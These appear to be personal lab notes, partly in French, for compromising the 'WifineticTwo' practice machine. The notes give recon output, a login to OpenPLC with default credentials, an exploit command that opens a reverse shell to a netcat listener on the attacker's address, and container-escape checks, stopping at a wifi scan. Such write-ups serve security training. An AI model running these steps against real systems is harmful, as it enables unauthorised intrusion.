# WifineticTwo
```shell
nmap -sC -sV 10.10.11.7
22/tcp   open     ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
53/tcp   filtered domain
8080/tcp open     http-proxy Werkzeug/1.0.1 Python/2.7.18
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://10.10.11.7:8080/login
|_http-server-header: Werkzeug/1.0.1 Python/2.7.18
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 232
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.Zk2tvA.DH9pN4pO0HO56GUAmu2tWK9bNQI; Expires=Wed, 22-May-2024 08:38:00 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Wed, 22 May 2024 08:33:00 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 302 FOUND
|     content-type: text/html; charset=utf-8
|     content-length: 219
|     location: http://0.0.0.0:8080/login
|     vary: Cookie
|     set-cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.Zk2tvA.3X8SP9upjKiQOORv-kVmkYc68yw; Expires=Wed, 22-May-2024 08:38:00 GMT; HttpOnly; Path=/
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Wed, 22 May 2024 08:33:00 GMT
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to target URL: <a href="/login">/login</a>. If not click the link.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     content-type: text/html; charset=utf-8
|     allow: HEAD, OPTIONS, GET
|     vary: Cookie
|     set-cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.Zk2tvA.DH9pN4pO0HO56GUAmu2tWK9bNQI; Expires=Wed, 22-May-2024 08:38:00 GMT; HttpOnly; Path=/
|     content-length: 0
|     server: Werkzeug/1.0.1 Python/2.7.18
|     date: Wed, 22 May 2024 08:33:00 GMT
|   RTSPRequest: 
|     HTTP/1.1 400 Bad request
|     content-length: 90
|     cache-control: no-cache
|     content-type: text/html
|     connection: close
|     <html><body><h1>400 Bad request</h1>
|     Your browser sent an invalid request.
|_    </body></html>
ffuf -u 'http://10.10.11.7:8080/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/common.txt
	dashboard               [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 95ms]
	hardware                [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 131ms]
	login                   [Status: 200, Size: 4550, Words: 1574, Lines: 138, Duration: 126ms]
	logout                  [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 130ms]
	monitoring              [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 171ms]
	programs                [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 255ms]
	settings                [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 167ms]
	users                   [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 230ms]
# on se co avec firefox, on voit que openplc est use, on check exploit
searchsploit "openplc"
# on find authenticated exploit, on search default username de openplc sur internet, cest openplc:openplc
# on arrive a se co, on va read et test exploit
nc -lvnp 8001
python3 exploit.py --ip 10.10.16.47 --port 8001 --target http://10.10.11.7:8080/ -U openplc -P openplc
# on est root, sauf que ca doit etre un container, on recup le user, on va test container escape
# on stabilise shell
# on try technique de https://tryhackme.com/r/room/containervulnerabilitiesDG
capsh --print
# pas exploitable
ls -la /var/run | grep sock
# pas de socket dans le container
nmap -sV -p 2375 10.10.11.7 
# pas de socket expose 
# on find quil faut use wifi pour privesc, on scan le reseau 
iwlist scan

```
